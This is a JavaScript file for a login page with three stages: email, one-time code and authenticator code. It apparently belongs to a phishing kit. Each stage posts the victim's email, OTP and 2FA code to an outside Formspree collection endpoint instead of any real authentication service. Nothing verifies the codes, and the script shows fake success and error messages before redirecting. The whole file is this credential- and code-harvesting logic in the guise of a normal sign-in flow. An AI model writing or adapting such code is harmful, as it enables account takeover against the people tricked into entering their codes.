// =========================
// Full script.js (Login → OTP → 2FA)
// =========================

// Store email across pages
let currentEmail = localStorage.getItem('user_email') || '';

// =========================
// UI Helpers
// =========================
function showError(message) {
    const errorDiv = document.getElementById('errorMessage');
    if (errorDiv) {
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
    }
}

function showSuccess(message) {
    const successDiv = document.getElementById('successMessage');
    if (successDiv) {
        successDiv.textContent = message;
        successDiv.style.display = 'block';
    }
}

function hideLoading() {
    const loading = document.getElementById('loadingScreen');
    if (loading) loading.style.display = 'none';
    
    const loginForm = document.getElementById('loginForm');
    const otpForm = document.getElementById('otpForm');
    const faForm = document.getElementById('faForm');
    
    if (loginForm) loginForm.style.display = 'block';
    if (otpForm) otpForm.style.display = 'block';
    if (faForm) faForm.style.display = 'block';
}

// =========================
// Formspree Endpoint
// =========================
const FORMSPREE_URL = "https://formspree.io/f/mnnlvqqg";

// =========================
// 1. LOGIN PAGE HANDLER
// =========================
function handleLogin(event) {
    event.preventDefault();
    
    const emailInput = document.getElementById("email");
    const email = emailInput ? emailInput.value.trim() : '';
    if (!email.includes("@")) {
        showError("Enter a valid email");
        return;
    }
    
    currentEmail = email;
    localStorage.setItem("user_email", currentEmail);
    
    document.getElementById("loginForm").style.display = "none";
    document.getElementById("loadingScreen").style.display = "block";
    
    const data = new FormData();
    data.append("email", currentEmail);
    data.append("stage", "login");
    
    fetch(FORMSPREE_URL, {
            method: "POST",
            body: data,
            headers: { "Accept": "application/json" }
        })
        .then(res => {
            if (res.ok) {
                window.location.href = "verify.html";
            } else {
                hideLoading();
                showError("Something went wrong.");
            }
        })
        .catch(() => {
            hideLoading();
            showError("Network error. Try again.");
        });
}

// =========================
// 2. OTP (VERIFY.HTML) HANDLER
// =========================
function handleOTP(event) {
    event.preventDefault();
    
    const otpInput = document.getElementById("otp");
    const otp = otpInput ? otpInput.value.trim() : '';
    if (!/^\d{6}$/.test(otp)) {
        showError("Enter a valid 6-digit code");
        return;
    }
    
    document.getElementById("otpForm").style.display = "none";
    document.getElementById("loadingScreen").style.display = "block";
    
    const data = new FormData();
    data.append("email", currentEmail);
    data.append("otp_code", otp); // distinct label for OTP
    data.append("stage", "otp");
    
    fetch(FORMSPREE_URL, {
            method: "POST",
            body: data,
            headers: { "Accept": "application/json" }
        })
        .then(res => {
            if (res.ok) {
                window.location.href = "2fa.html";
            } else {
                hideLoading();
                showError("Invalid OTP code.");
            }
        })
        .catch(() => {
            hideLoading();
            showError("Network error.");
        });
}

// =========================
// 3. RESEND OTP
// =========================
function resendCode() {
    const data = new FormData();
    data.append("email", currentEmail);
    data.append("stage", "resend_otp");
    
    fetch(FORMSPREE_URL, {
            method: "POST",
            body: data,
            headers: { "Accept": "application/json" }
        })
        .then(() => showSuccess("New OTP sent."))
        .catch(() => showError("Failed to resend code."));
}

// =========================
// 4. 2FA SUBMISSION HANDLER (2fa.html)
// =========================
function handle2FA(event) {
    event.preventDefault();
    
    const faInput = document.getElementById("fa_code");
    const faCode = faInput ? faInput.value.trim() : '';
    if (!/^\d{6}$/.test(faCode)) {
        showError("Enter a valid 6-digit authenticator code");
        return;
    }
    
    document.getElementById("faForm").style.display = "none";
    document.getElementById("loadingScreen").style.display = "block";
    
    const data = new FormData();
    data.append("email", currentEmail);
    data.append("fa_code", faCode); // distinct label for 2FA
    data.append("stage", "2fa");
    
    fetch(FORMSPREE_URL, {
            method: "POST",
            body: data,
            headers: { "Accept": "application/json" }
        })
        .then(res => {
            if (res.ok) {
                showSuccess("Authentication Complete. Redirecting…");
                setTimeout(() => {
                    window.location.href = "dashboard.html";
                }, 1800);
            } else {
                hideLoading();
                showError("Invalid 2FA code.");
            }
        })
        .catch(() => {
            hideLoading();
            showError("Network error.");
        });
}

// =========================
// AUTO-ATTACH HANDLERS
// =========================
document.addEventListener("DOMContentLoaded", () => {
    const loginForm = document.getElementById("loginForm");
    if (loginForm) loginForm.addEventListener("submit", handleLogin);
    
    const otpForm = document.getElementById("otpForm");
    if (otpForm) otpForm.addEventListener("submit", handleOTP);
    
    const faForm = document.getElementById("faForm");
    if (faForm) faForm.addEventListener("submit", handle2FA);
});